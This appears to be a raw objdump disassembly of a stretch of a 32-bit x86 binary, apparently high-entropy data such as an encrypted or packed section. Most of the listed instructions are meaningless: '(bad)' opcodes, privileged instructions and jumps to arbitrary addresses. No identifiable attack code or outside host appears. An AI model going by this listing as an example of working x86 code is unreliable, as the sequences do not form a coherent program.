  401ab7:	out    0x52,al
  401ab9:	inc    esi
  401aba:	aad    0x6d
  401abc:	and    eax,0xd30dd61c
  401ac1:	addr16 inc ebp
  401ac3:	add    edi,DWORD PTR [ebp-0x58]
  401ac6:	xlat   BYTE PTR ds:[ebx]
  401ac7:	fdivrp st(0),st
  401ac9:	push   edi
  401aca:	loop   0x401ab7
  401acc:	js     0x401b36
  401ace:	outs   dx,BYTE PTR ds:[esi]
  401acf:	jne    0x401b45
  401ad1:	std    
  401ad2:	xchg   DWORD PTR [ecx-0x605a170a],esp
  401ad8:	icebp  
  401ad9:	mov    bl,0xe
  401adb:	jmp    DWORD PTR [esi]
  401add:	jecxz  0x401a76
  401adf:	sbb    DWORD PTR [edi+0x4d],edi
  401ae2:	cmc    
  401ae3:	sbb    dl,cl
  401ae5:	les    ebx,FWORD PTR [esi-0x993df2f]
  401aeb:	pop    edx
  401aec:	sub    DWORD PTR [eax],edx
  401aee:	xchg   esi,eax
  401aef:	stos   DWORD PTR es:[edi],eax
  401af0:	pop    edx
  401af1:	fs dec edi
  401af3:	enter  0x3a13,0xa1
  401af7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401af8:	inc    ebp
  401af9:	add    BYTE PTR [edi],0x92
  401afc:	clc    
  401afd:	xchg   ebp,eax
  401afe:	sbb    al,0xc
  401b00:	mov    edx,0xcaf3e35f
  401b05:	dec    edi
  401b06:	(bad)  
  401b08:	sub    DWORD PTR [edx],edi
  401b0a:	shl    ebx,cl
  401b0c:	jb     0x401ad3
  401b0e:	in     eax,dx
  401b0f:	add    al,0x8f
  401b11:	lock imul ebp,edx,0xf8c08cef
  401b18:	adc    dl,ah
  401b1a:	push   0x61
  401b1c:	aam    0x27
  401b1e:	cmc    
  401b1f:	xlat   BYTE PTR ds:[ebx]
  401b20:	mov    bl,0x92
  401b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b23:	mov    edi,edi
  401b25:	jmp    0x5006e871
  401b2a:	add    ah,bh
  401b2c:	jns    0x401b1b
  401b2e:	adc    BYTE PTR [eiz*4-0xb29a298],al
  401b35:	lahf   
  401b36:	push   0x13
  401b38:	mov    WORD PTR [ebx-0x2b],?
  401b3b:	mov    bh,0x9c
  401b3d:	test   bh,bl
  401b3f:	push   0x52dd9a00
  401b44:	push   ecx
  401b45:	mov    ds:0xa45b6c04,al
  401b4a:	push   ss
  401b4b:	(bad)  
  401b4c:	imul   ebp,DWORD PTR [eax-0x12],0x6b
  401b50:	add    eax,0x97520c91
  401b55:	jmp    0x401bc6
  401b57:	stos   DWORD PTR es:[edi],eax
  401b58:	jle    0x401b16
  401b5a:	(bad)  
  401b5b:	out    dx,eax
  401b5c:	and    DWORD PTR [ecx],edx
  401b5e:	(bad)  
  401b5f:	icebp  
  401b60:	mov    dh,0x61
  401b62:	test   DWORD PTR [eax-0x32e21216],0xe412774a
  401b6c:	add    eax,DWORD PTR ds:0x2bde9c70
  401b72:	pop    edx
  401b73:	rol    DWORD PTR [edx],cl
  401b75:	popf   
  401b76:	inc    ebp
  401b77:	retf   0x24df
  401b7a:	in     eax,0x66
  401b7c:	ins    BYTE PTR es:[edi],dx
  401b7d:	cmp    BYTE PTR [edi+0x501f88d9],al
  401b83:	dec    eax
  401b84:	mov    esp,0x97f89c78
  401b89:	ret    0x7220
  401b8c:	nop
  401b8d:	sti    
  401b8e:	dec    eax
  401b8f:	or     al,0xab
  401b91:	daa    
  401b92:	les    esp,FWORD PTR [esi-0x1b]
  401b95:	scas   eax,DWORD PTR es:[edi]
  401b96:	retf   
  401b97:	fmul   DWORD PTR [ecx+ecx*1]
  401b9a:	and    edi,DWORD PTR [ecx-0x24a67bf9]
  401ba0:	mov    ah,0x81
  401ba2:	fcom   DWORD PTR [eax+eiz*8+0x6b]
  401ba6:	(bad)  
  401ba7:	mov    edx,0x920b21ee
  401bac:	and    ah,BYTE PTR [ebx+0x11dba5c]
  401bb2:	jp     0x401b9f
  401bb4:	jmp    0x8b0ef80f
  401bb9:	fdiv   QWORD PTR [esi+eax*2+0x7f62ac24]
  401bc0:	cmp    ebp,DWORD PTR [esi]
  401bc2:	gs pop ecx
  401bc4:	rcl    BYTE PTR [ecx-0x1c],0x8c
  401bc8:	(bad)  
  401bc9:	mov    cl,0x52
  401bcb:	jbe    0x401b82
  401bcd:	add    ebp,DWORD PTR [edi+0x64fee814]
  401bd3:	ret    0xb93d
  401bd6:	pop    esp
  401bd7:	and    eax,0x41ed4df5
  401bdc:	sub    BYTE PTR [ebx],cl
  401bde:	cmp    edx,DWORD PTR [ebp+0x67]
  401be1:	out    dx,al
  401be2:	enter  0x9468,0xfc
  401be6:	lds    edx,FWORD PTR [esi]
  401be8:	aad    0x18
  401bea:	pop    es
  401beb:	(bad)  
  401bed:	pop    ebx
  401bee:	(bad)  [edi]
  401bf0:	and    BYTE PTR [ecx-0xe],bl
  401bf3:	jns    0x401be7
  401bf5:	jl     0x401bcd
  401bf7:	mov    ebp,0x52a303c3
  401bfc:	or     BYTE PTR [eax],dh
  401bfe:	cmp    eax,DWORD PTR [ebp+0x4b1c5dff]
  401c04:	mov    dl,BYTE PTR [ebx+0x68]
  401c07:	and    eax,DWORD PTR [ecx+eax*1]
  401c0a:	sub    DWORD PTR [esi],esi
  401c0c:	aaa    
  401c0d:	jge    0x401b9b
  401c0f:	retf   
  401c10:	shl    BYTE PTR [edx-0x68],cl
  401c13:	leave  
  401c14:	push   ebx
  401c15:	adc    eax,0xd20138a4
  401c1a:	popf   
  401c1b:	out    dx,al
  401c1c:	popa   
  401c1d:	mov    bh,0xa6
  401c1f:	(bad)  
  401c20:	loopne 0x401c5d
  401c22:	mov    eax,eax
  401c24:	jp     0x401c1e
  401c26:	cmc    
  401c27:	xchg   ebp,eax
  401c28:	pusha  
  401c29:	sbb    bh,BYTE PTR ds:0x9fcda046
  401c2f:	xor    DWORD PTR [eax],esp
  401c31:	inc    ebx
  401c32:	inc    ecx
  401c33:	cli    
  401c34:	fiadd  DWORD PTR [esi-0x7e2e7a08]
  401c3a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c3b:	add    ch,dl
  401c3d:	in     al,0x7f
  401c3f:	(bad)  
  401c40:	out    dx,eax
  401c41:	sti    
  401c42:	xchg   ebp,eax
  401c43:	pop    es
  401c44:	pop    ds
  401c45:	xor    al,0xf5
  401c47:	inc    edx
  401c48:	jecxz  0x401c1a
  401c4a:	xor    ah,BYTE PTR [eax-0x12c2908b]
  401c50:	jmp    0x401c9b
  401c52:	or     al,0x30
  401c54:	scas   al,BYTE PTR es:[edi]
  401c55:	and    bl,BYTE PTR [eax-0x7f]
  401c58:	je     0x401c9e
  401c5a:	push   0x7e8d7bb6
  401c5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c60:	mov    edx,0x8d5e707d
  401c65:	sub    ah,BYTE PTR [esi+0x8373967]
  401c6b:	ficom  WORD PTR [esi]
  401c6d:	xor    eax,ecx
  401c6f:	push   esp
  401c70:	inc    esp
  401c71:	and    eax,0x617d8836
  401c76:	pop    eax
  401c77:	pop    ds
  401c78:	ds (bad) 
  401c7a:	jmp    0xac31:0x906cc366
  401c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c82:	and    al,0x63
  401c84:	aam    0xd2
  401c86:	or     DWORD PTR ds:0x30f7df5c,0x79
  401c8d:	xor    BYTE PTR [eax-0x68],al
  401c90:	mov    BYTE PTR [ebp+0x1d],al
  401c93:	loop   0x401ccf
  401c95:	mov    ebp,0x2978f453
  401c9a:	and    al,0x35
  401c9c:	int    0x6
  401c9e:	icebp  
  401c9f:	sbb    ah,al
  401ca1:	pop    ss
  401ca2:	inc    edx
  401ca3:	into   
  401ca4:	pop    ss
  401ca5:	(bad)  
  401ca7:	sbb    edi,DWORD PTR [edx+0xb]
  401caa:	mov    ds:0x4ca3afb9,eax
  401caf:	fadd   st(4),st
  401cb1:	nop
  401cb2:	add    ah,BYTE PTR [ecx-0x6d78a3f1]
  401cb8:	or     cl,bl
  401cba:	in     al,dx
  401cbb:	into   
  401cbc:	adc    ch,ch
  401cbe:	or     DWORD PTR [edx+0x2e],0xb11a7f18
  401cc5:	rcl    BYTE PTR [ebx-0x12bac881],0x62
  401ccc:	arpl   WORD PTR [ecx-0x12],bx
  401ccf:	fucomp st(7)
  401cd1:	fcomp  QWORD PTR [ebx+0x3f841426]
  401cd7:	mov    edx,0xf1b12e83
  401cdc:	lahf   
  401cdd:	adc    eax,0x7343317c
  401ce2:	into   
  401ce3:	adc    DWORD PTR [edx+0x14],ebp
  401ce6:	outs   dx,DWORD PTR ds:[esi]
  401ce7:	in     eax,dx
  401ce8:	ins    BYTE PTR es:[edi],dx
  401ce9:	je     0x401d04
  401ceb:	or     DWORD PTR [ecx-0x1130a12d],0x7b1b269a
  401cf5:	xchg   esi,eax
  401cf6:	test   BYTE PTR [ebx-0x785bf7ae],cl
  401cfc:	ss sahf 
  401cfe:	cmp    esi,DWORD PTR [esi-0x78c3f31b]
  401d04:	inc    eax
  401d05:	(bad)  
  401d06:	cmc    
  401d07:	mov    bh,0x30
  401d09:	fdivr  DWORD PTR [esi]
  401d0b:	sti    
  401d0c:	arpl   bx,sp
  401d0e:	fidiv  WORD PTR [ecx+esi*8+0x64]
  401d12:	in     al,dx
  401d13:	es in  al,0xf2
  401d16:	rol    DWORD PTR [ebx],0x20
  401d19:	push   ds
  401d1a:	xchg   DWORD PTR [ebp+0x33],eax
  401d1d:	inc    edx
  401d1e:	mov    ecx,0xb906bbc8
  401d23:	js     0x401cf9
  401d25:	push   0x13e38931
  401d2a:	pop    edi
  401d2b:	lods   al,BYTE PTR ds:[esi]
  401d2c:	mov    ecx,0x57a8a8a0
  401d31:	pop    ss
  401d32:	popa   
  401d33:	jp     0x401d8d
  401d35:	fisttp QWORD PTR [eax-0x48]
  401d38:	pusha  
  401d39:	dec    ebx
  401d3a:	mov    dh,0xb1
  401d3c:	add    al,0xb8
  401d3e:	pop    eax
  401d3f:	cmp    DWORD PTR [ebx-0x6c],esi
  401d42:	test   al,0x4d
  401d44:	mov    bl,0xd7
  401d46:	jmp    0xe124:0xaedd15cd
  401d4d:	out    0xe0,eax
  401d4f:	aas    
  401d50:	out    dx,al
  401d51:	push   eax
  401d52:	outs   dx,DWORD PTR ds:[esi]
  401d53:	inc    edi
  401d54:	push   cs
  401d55:	sub    eax,0xb0e4ea75
  401d5a:	and    ecx,esi
  401d5c:	imul   edi,DWORD PTR [eax],0x508228b6
  401d62:	inc    edx
  401d63:	loop   0x401d0e
  401d65:	jg     0x401d93
  401d67:	into   
  401d68:	push   edx
  401d69:	aam    0xb5
  401d6b:	xchg   ebp,eax
  401d6c:	cdq    
  401d6d:	jecxz  0x401d9c
  401d6f:	xchg   edi,eax
  401d70:	pop    ss
  401d71:	aaa    
  401d72:	push   edi
  401d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d74:	js     0x401d7d
  401d76:	inc    esi
  401d77:	daa    
  401d78:	and    ecx,DWORD PTR [edi+0x6a]
  401d7b:	jge    0x401d04
  401d7d:	in     al,dx
  401d7e:	sub    DWORD PTR [edx+esi*2+0x718c62c8],0xfffffff6
  401d86:	mov    esp,0xf8f459ad
  401d8b:	mov    edx,0xff955f7f
  401d90:	arpl   dx,bp
  401d92:	or     eax,0x6b009475
  401d97:	push   0x8f843543
  401d9c:	push   cs
  401d9d:	sbb    eax,0x8a6c627
  401da2:	mov    cl,0xa8
  401da4:	in     eax,dx
  401da5:	test   BYTE PTR [ecx],bh
  401da7:	dec    edi
  401da8:	dec    edi
  401da9:	jmp    0x401de7
  401dab:	or     BYTE PTR [edi+0x1fc08140],dl
  401db1:	push   0xffffffc7
  401db3:	xlat   BYTE PTR ds:[ebx]
  401db4:	lahf   
  401db5:	jmp    0x401de9
  401db7:	and    BYTE PTR [ebx-0x19],ah
  401dba:	sbb    eax,0xa8c25105
  401dbf:	inc    edx
  401dc0:	push   ecx
  401dc1:	mov    ecx,0xa792bd32
  401dc6:	ds cwde 
  401dc8:	ret    0x9e53
  401dcb:	mov    ch,BYTE PTR [eax+ebx*2-0x5d]
  401dcf:	and    DWORD PTR [ebx-0x2f4870b4],edx
  401dd5:	icebp  
  401dd6:	call   0x680cfd5d
  401ddb:	adc    al,0x38
  401ddd:	sbb    bh,ch
  401ddf:	les    ebp,FWORD PTR [edx+esi*1+0x65a604c]
  401de6:	cmp    edi,DWORD PTR [esp-0x5ce0edfb]
  401ded:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dee:	sti    
  401def:	xchg   esp,eax
  401df0:	pop    ebp
  401df1:	push   0x546e0869
  401df6:	mov    bl,0x59
  401df8:	aas    
  401df9:	pop    ss
  401dfa:	stc    
  401dfb:	mov    dl,0xc9
  401dfd:	pop    edx
  401dfe:	cmp    BYTE PTR [ebx+0x21],dl
  401e01:	sahf   
  401e02:	fdiv   st,st(1)
  401e04:	mov    al,0xbe
  401e06:	xchg   ecx,eax
  401e07:	mov    al,ds:0xf63a3bdf
  401e0c:	add    DWORD PTR [edi],esi
  401e0e:	xor    al,BYTE PTR [eax+0x12]
  401e11:	xor    al,BYTE PTR [ebx+0x69]
  401e14:	into   
  401e15:	dec    edx
  401e16:	xor    eax,0xac4b2e24
  401e1b:	cmc    
  401e1c:	ror    BYTE PTR [esi],1
  401e1e:	aam    0xf4
  401e20:	cmp    al,ch
  401e22:	cld    
  401e23:	dec    edx
  401e24:	js     0x401ea5
  401e26:	ret    
  401e27:	or     DWORD PTR [edx+0x29],0x59
  401e2b:	jmp    0x32a1066e
  401e30:	add    al,0x31
  401e32:	xor    BYTE PTR [ebx],0xe4
  401e35:	hlt    
  401e36:	xor    al,0xa7
  401e38:	sbb    dl,BYTE PTR [esi+0x4e0dbed0]
  401e3e:	dec    esp
  401e3f:	xchg   esi,eax
  401e40:	fistp  DWORD PTR [esi]
  401e42:	cmp    DWORD PTR [ebp+0xf],ecx
  401e45:	sub    dh,bh
  401e47:	outs   dx,DWORD PTR ds:[esi]
  401e48:	dec    edx
  401e49:	jp     0x401eb6
  401e4b:	popf   
  401e4c:	mov    ah,0x2c
  401e4e:	push   ebp
  401e4f:	sahf   
  401e50:	(bad)  
  401e51:	fld    DWORD PTR [eax]
  401e53:	call   0x1e05583e
  401e58:	arpl   WORD PTR [edx-0x28],ax
  401e5b:	mov    eax,DWORD PTR [edi+0x20]
  401e5e:	add    eax,0x18060139
  401e63:	clc    
  401e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e65:	jecxz  0x401e93
  401e67:	mov    ecx,0x7c1126d
  401e6c:	adc    BYTE PTR [ebp+0x18],bh
  401e6f:	cmp    bl,ch
  401e71:	fisubr DWORD PTR [ebp-0x4a]
  401e74:	adc    edx,esp
  401e76:	jle    0x401ede
  401e78:	sub    BYTE PTR [edi-0x1f],0x9b
  401e7c:	ins    BYTE PTR es:[edi],dx
  401e7d:	ret    
  401e7e:	outs   dx,DWORD PTR ds:[esi]
  401e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e80:	lds    esi,FWORD PTR [edx+0x4a]
  401e83:	jecxz  0x401e67
  401e85:	ret    0xf9b5
  401e88:	xor    ebx,esp
  401e8a:	cmp    BYTE PTR [edx],0x48
  401e8d:	pop    esi
  401e8e:	cmp    DWORD PTR [esi+0x4d],ecx
  401e91:	daa    
  401e92:	add    dh,BYTE PTR [edi-0x165e6944]
  401e98:	dec    eax
  401e99:	push   0xffffffd5
  401e9b:	mov    dl,0xe5
  401e9d:	push   0xffffffa4
  401e9f:	xor    al,0x1a
  401ea1:	jmp    0x401e78
  401ea3:	ss jmp 0xb549b730
  401ea9:	sub    BYTE PTR [ebx+eiz*1],bl
  401eac:	out    0xfd,al
  401eae:	call   0x5e24:0x251b0aaa
  401eb5:	pop    esp
  401eb6:	xchg   edx,eax
  401eb7:	addr16 cmc 
  401eb9:	cli    
  401eba:	lahf   
  401ebb:	mov    esp,0x866e0c26
  401ec0:	mov    al,0xd9
  401ec2:	mov    esp,DWORD PTR [ecx+0xba88889]
  401ec8:	xor    DWORD PTR [edx+0x62096a2c],ebx
  401ece:	pop    es
  401ecf:	push   edi
  401ed0:	pop    ecx
  401ed1:	push   ss
  401ed2:	mov    al,0x44
  401ed4:	adc    ch,BYTE PTR [ebx+0x44]
  401ed7:	push   es
  401ed8:	call   0x1e3e98cb
  401edd:	popf   
  401ede:	or     esi,esi
  401ee0:	hlt    
  401ee1:	aaa    
  401ee2:	mov    dl,0x8e
  401ee4:	sbb    ah,ch
  401ee6:	dec    edx
  401ee7:	aam    0xe4
  401ee9:	pop    ds
  401eea:	inc    eax
  401eeb:	xlat   BYTE PTR ds:[ebx]
  401eec:	mov    ds:0x7c6b8a6b,eax
  401ef1:	in     al,dx
  401ef2:	ret    
  401ef3:	ret    0x8f64
  401ef6:	sahf   
  401ef7:	fadd   QWORD PTR [ebx*8-0x62442067]
  401efe:	popf   
  401eff:	out    0xee,eax
  401f01:	adc    bl,BYTE PTR ds:0xf5747d7b
  401f07:	inc    ebp
  401f08:	lds    ebp,FWORD PTR [edx+esi*8+0x41ce2e96]
  401f0f:	test   DWORD PTR [ecx+0x40edb6b3],eax
  401f15:	mov    dh,0xaf
  401f17:	and    ch,BYTE PTR [esp+eax*4+0x48]
  401f1b:	inc    esp
  401f1c:	inc    eax
  401f1d:	fcomp  QWORD PTR [ebx]
  401f1f:	sbb    BYTE PTR [esi+edx*8+0x63f61242],ah
  401f26:	cmp    ebp,edi
  401f28:	popf   
  401f29:	xchg   esi,eax
  401f2a:	xchg   esi,eax
  401f2b:	in     eax,0x59
  401f2d:	std    
  401f2e:	sbb    DWORD PTR [eax-0x30],ebx
  401f31:	aaa    
  401f32:	mov    bh,0xaf
  401f34:	inc    ebx
  401f35:	jo     0x401f0f
  401f37:	add    ch,bl
  401f39:	arpl   dx,dx
  401f3b:	nop
  401f3c:	cdq    
  401f3d:	jg     0x401f34
  401f3f:	jno    0x401f83
  401f41:	cmp    al,0xeb
  401f43:	and    al,0x35
  401f45:	push   edi
  401f46:	data16 mov ds:0xb43a4293,al
  401f4c:	xchg   ecx,eax
  401f4d:	call   0xb907f21d
  401f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f53:	out    0xa0,eax
  401f55:	test   al,0xa9
  401f57:	outs   dx,DWORD PTR ds:[esi]
  401f58:	fcomp  DWORD PTR [edx-0x12]
  401f5b:	aam    0x4e
  401f5d:	push   ss
  401f5e:	pop    ebx
  401f5f:	add    cl,BYTE PTR [ebx+0xfc47b3e]
  401f65:	push   esp
  401f66:	jle    0x401f2a
  401f68:	pop    es
  401f69:	or     BYTE PTR ds:0x42f46faf,ah
  401f6f:	cmovb  edi,DWORD PTR [eax+0x64]
  401f73:	(bad)  
  401f74:	and    eax,0x7bbbfefa
  401f79:	mov    ebp,0x8443dba4
  401f7e:	cmp    ah,bh
  401f80:	push   cs
  401f81:	rcr    BYTE PTR [edi+0x2e0f4058],1
  401f87:	mov    bl,0x21
  401f89:	fistp  WORD PTR [ebx-0x6c]
  401f8c:	arpl   WORD PTR [edi+0x73d78b3],di
  401f92:	pop    es
  401f93:	push   ss
  401f94:	out    0xb1,eax
  401f96:	pop    ebx
  401f97:	inc    ecx
  401f98:	cmc    
  401f99:	add    BYTE PTR [esi-0x2f],ah
  401f9c:	cmp    al,0x11
  401f9e:	push   ecx
  401f9f:	pop    esp
  401fa0:	mov    ebp,0x6c74ec5a
  401fa5:	jge    0x401fef
  401fa7:	dec    esp
  401fa8:	mov    eax,edx
  401faa:	jns    0x401f5a
  401fac:	fisubr DWORD PTR [esi+ebp*1]
  401faf:	ror    BYTE PTR [edx],1
  401fb1:	or     bh,cl
  401fb3:	adc    dh,BYTE PTR [eax]
  401fb5:	push   es
  401fb6:	sub    eax,0x19e432ac
  401fbb:	sti    
  401fbc:	fsubr  QWORD PTR [ebp+0x73a0db02]
  401fc2:	mov    ah,0x7f
  401fc4:	pop    esi
  401fc5:	mov    ds:0x1196aa4a,al
  401fca:	enter  0xb8e9,0x66
  401fce:	xchg   esi,eax
  401fcf:	mov    dh,0xf9
  401fd1:	push   0x17d552c0
  401fd6:	das    
  401fd7:	sub    eax,0xf703d5b5
  401fdc:	sbb    edx,DWORD PTR [edx+0x58]
  401fdf:	int    0xd9
  401fe1:	mov    ecx,0x9def15fe
  401fe6:	or     eax,0xbdb94b90
  401feb:	mov    eax,edx
  401fed:	add    edi,ebx
  401fef:	mov    bl,0x3
  401ff1:	repz jno 0x401fc7
  401ff4:	add    BYTE PTR [ecx+ebp*4+0x9],0x85
  401ff9:	pop    ebp
  401ffa:	cwde   
  401ffb:	xor    BYTE PTR [eax-0x38],bl
  401ffe:	adc    ebx,ecx
  402000:	retf   0x6cf3
  402003:	nop
  402004:	push   cs
  402005:	test   ch,dh
  402007:	imul   esp,DWORD PTR [ebp+0x4276dbb],0xffffffc0
  40200e:	xchg   ecx,eax
  40200f:	sub    eax,0x63845e18
  402014:	fwait
  402015:	test   DWORD PTR [edi],esp
  402017:	pusha  
  402018:	and    al,0xf
  40201a:	lods   eax,DWORD PTR ds:[esi]
  40201b:	mov    ecx,0xf3fe2a16
  402020:	neg    BYTE PTR [esi+0x3]
  402023:	cs mov bl,0xea
  402026:	add    DWORD PTR [esi],0xffffffa9
  402029:	bound  esp,QWORD PTR [esi-0x4c96ab3b]
  40202f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402030:	pop    edi
  402031:	and    edi,DWORD PTR [edx+0x37f2e6fb]
  402037:	cld    
  402038:	lods   eax,DWORD PTR ds:[esi]
  402039:	pop    eax
  40203a:	mov    edx,0xbadd5cc0
  40203f:	jge    0x402007
  402041:	jo     0x40207c
  402043:	aaa    
  402044:	in     eax,dx
  402045:	out    dx,al
  402046:	sbb    ch,BYTE PTR [ebx+esi*4]
  402049:	sub    DWORD PTR [ebx+0x7643529a],esi
  40204f:	test   al,0x0
  402051:	and    eax,0xb8e3062f
  402056:	mov    DWORD PTR [ebx+0x3b],eax
  402059:	cmp    ch,BYTE PTR [esi+0xa]
  40205c:	mov    ebp,0x27bedab9
  402061:	ficom  WORD PTR [esi+0xa3a0c42]
  402067:	retf   
  402068:	cmp    dh,dl
  40206a:	xchg   ebx,eax
  40206b:	cld    
  40206c:	sbb    al,0x57
  40206e:	aam    0x55
  402070:	xor    eax,0xcd681e92
  402075:	addr16 xchg edx,eax
  402077:	ja     0x4020b8
  402079:	or     eax,0x67a17946
  40207e:	ret    
  40207f:	mov    esi,0x489b6e2f
  402084:	pop    ds
  402085:	add    BYTE PTR [esp+ebp*2-0x75],bl
  402089:	xchg   edi,eax
  40208a:	loopne 0x4020a6
  40208c:	out    0x24,eax
  40208e:	pop    es
  40208f:	leave  
  402090:	cmp    bh,dl
  402092:	push   es
  402093:	xlat   BYTE PTR ds:[ebx]
  402094:	xor    al,0x67
  402096:	cmp    eax,DWORD PTR [ebp-0x49]
  402099:	xor    BYTE PTR [esi],dh
  40209b:	shl    cl,0xf8
  40209e:	mov    ?,WORD PTR [edx+0x60]
  4020a1:	xchg   edx,eax
  4020a2:	mov    ebx,0x56e8f095
  4020a7:	or     DWORD PTR [ebp-0x529fca10],esi
  4020ad:	or     ah,bl
  4020af:	ror    eax,0x8d
  4020b2:	(bad)  
  4020b4:	call   0xeaacaf61
  4020b9:	arpl   WORD PTR [ebp-0x92b0f8c],di
  4020bf:	jmp    0x4020c6
  4020c1:	loope  0x4020c6
  4020c3:	dec    edi
  4020c4:	xchg   ebp,eax
  4020c5:	or     edx,esp
  4020c7:	mov    edx,cs
  4020c9:	pop    ebx
  4020ca:	add    esp,ebp
  4020cc:	cmp    ebp,DWORD PTR [ecx-0x50ab2825]
  4020d2:	or     dh,BYTE PTR [eax-0x2e4cdeaa]
  4020d8:	fadd   st(0),st
  4020da:	fild   DWORD PTR [ebx-0x56820342]
  4020e0:	and    ebx,DWORD PTR [eax]
  4020e2:	pop    esi
  4020e3:	(bad)  
  4020e5:	jg     0x4020a8
  4020e7:	in     eax,dx
  4020e8:	ins    BYTE PTR es:[edi],dx
  4020e9:	das    
  4020ea:	jno    0x4020be
  4020ec:	xchg   ecx,eax
  4020ed:	call   0x34f8:0x2c66f7b2
  4020f4:	cli    
  4020f5:	shl    DWORD PTR [eax+0x435f2063],0xac
  4020fc:	inc    ebp
  4020fd:	clc    
  4020fe:	xchg   bp,ax
  402100:	mov    al,ds:0x8bc7220c
  402105:	test   al,0x67
  402107:	cmp    cl,BYTE PTR [ebp+esi*8+0x0]
  40210b:	jmp    0x9e8e:0x2a4741d0
  402112:	out    dx,eax
  402113:	add    BYTE PTR [esi+ecx*1+0xb73010f],0x3d
  40211b:	cmp    edi,DWORD PTR [ebp+eax*1-0x5c]
  40211f:	test   al,0x39
  402121:	rol    BYTE PTR [edi+0x43d25c37],0x31
  402128:	or     DWORD PTR [esi-0x4b],ebx
  40212b:	cmp    DWORD PTR [ebp-0x7eea835b],esp
  402131:	or     BYTE PTR [ecx+0x48],bh
  402134:	scas   al,BYTE PTR es:[edi]
  402135:	sti    
  402136:	into   
  402137:	shl    BYTE PTR [eax+0x60],1
  40213a:	mov    cl,0x40
  40213c:	dec    esi
  40213d:	adc    eax,0xecec9a68
  402142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402143:	and    dh,bh
  402145:	sub    al,0x5d
  402147:	cld    
  402148:	aad    0x58
  40214a:	lahf   
  40214b:	mov    edi,0xecc3cfa4
  402150:	das    
  402151:	fbstp  TBYTE PTR [esi]
  402153:	pop    esp
  402154:	inc    edx
  402155:	inc    esi
  402156:	mov    bl,0xb5
  402158:	dec    ecx
  402159:	mov    ch,0x66
  40215b:	cmp    DWORD PTR [esi+edx*2],edi
  40215e:	xchg   edx,eax
  40215f:	lahf   
  402160:	or     al,0xd9
  402162:	fidiv  DWORD PTR [ebp+ebx*2-0x7a4aa866]
  402169:	fcom   st(7)
  40216b:	call   0xc3258859
  402170:	pop    ds
  402171:	cmp    eax,DWORD PTR [ecx]
  402173:	adc    BYTE PTR [esp+esi*2],cl
  402176:	push   cs
  402177:	scas   al,BYTE PTR es:[edi]
  402178:	mov    esp,0xcb6da038
  40217d:	fld    DWORD PTR [eax+0x7f]
  402180:	jbe    0x4021d8
  402182:	ficom  DWORD PTR [ecx]
  402184:	adc    BYTE PTR [edx],0xc9
  402187:	push   ebx
  402188:	clc    
  402189:	or     BYTE PTR [esi+esi*4+0x7b2b1d2f],0x2f
  402191:	xor    esi,DWORD PTR [edx-0x49]
  402194:	xor    cl,BYTE PTR [edx]
  402196:	lods   al,BYTE PTR ds:[esi]
  402197:	xchg   BYTE PTR [ecx+0x53d8ea91],ah
  40219d:	push   edx
  40219e:	lods   al,BYTE PTR ds:[esi]
  40219f:	neg    BYTE PTR [edx+0x2a]
  4021a2:	push   cs
  4021a3:	mov    ds:0x1f8feba0,al
  4021a8:	push   cs
  4021a9:	jno    0x40221f
  4021ab:	xchg   ebx,eax
  4021ac:	sbb    BYTE PTR [esi+0x155e694b],bh
  4021b2:	and    al,bh
  4021b4:	jo     0x402234
  4021b6:	and    al,0x7
  4021b8:	ds mov esp,0x45affd86
  4021be:	bound  esi,QWORD PTR [esp+eax*4]
  4021c1:	sub    BYTE PTR [esi-0x468502e1],0x77
  4021c8:	mov    eax,ds:0xd4046fe1
  4021cd:	les    edi,FWORD PTR [ebp+0x76]
  4021d0:	cmp    eax,0x878d23c5
  4021d5:	pushf  
  4021d6:	ret    
  4021d7:	xchg   ebp,eax
  4021d8:	retf   
  4021d9:	mov    fs,edi
  4021db:	jle    0x40221b
  4021dd:	mov    edx,0x4a13bbe0
  4021e2:	sahf   
  4021e3:	pop    ecx
  4021e4:	retf   0x9739
  4021e7:	push   eax
  4021e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021e9:	inc    eax
  4021ea:	(bad)  
  4021eb:	out    dx,al
  4021ec:	retf   
  4021ed:	and    dh,BYTE PTR [edx+0x20]
  4021f0:	hlt    
  4021f1:	les    esi,FWORD PTR [ebx-0x42]
  4021f4:	mov    ?,WORD PTR [ebx-0x45]
  4021f7:	xor    edi,ebx
  4021f9:	push   eax
  4021fa:	fld    DWORD PTR [ebx-0x5a605383]
  402200:	popf   
  402201:	icebp  
  402202:	mov    cl,0x92
  402204:	mov    DWORD PTR [esi],0x9c393908
  40220a:	(bad)  
  40220b:	jno    0x4021f6
  40220d:	fcom   QWORD PTR [ebx+0x29471331]
  402213:	data16 xchg BYTE PTR ds:0x3e39cfbc,ah
  40221a:	inc    ecx
  40221b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40221c:	popf   
  40221d:	push   ss
  40221e:	sbb    ebx,DWORD PTR [eax+0x4a98c96c]
  402224:	(bad)  
  402225:	inc    esi
  402226:	mov    ah,0xcd
  402228:	fnstcw WORD PTR [edi+ebx*1-0x70]
  40222c:	retf   0x2756
  40222f:	xor    DWORD PTR [ecx],edi
  402231:	(bad)  [edx+eiz*2]
  402234:	inc    cl
  402236:	cmp    eax,0x4405494c
  40223b:	cmc    
  40223c:	clc    
  40223d:	mov    dl,0x41
  40223f:	mov    bh,0x66
  402241:	bound  edi,QWORD PTR [ebx-0x7a]
  402244:	mov    BYTE PTR [ecx],bh
  402246:	add    dh,bh
  402248:	fmul   DWORD PTR [ecx+0x606177eb]
  40224e:	cmp    BYTE PTR [ecx-0x75dcfbc6],dh
  402254:	loopne 0x4022b1
  402256:	xor    BYTE PTR [edi-0x3b],ch
  402259:	xchg   ebp,eax
  40225a:	fimul  WORD PTR [edx+eiz*1]
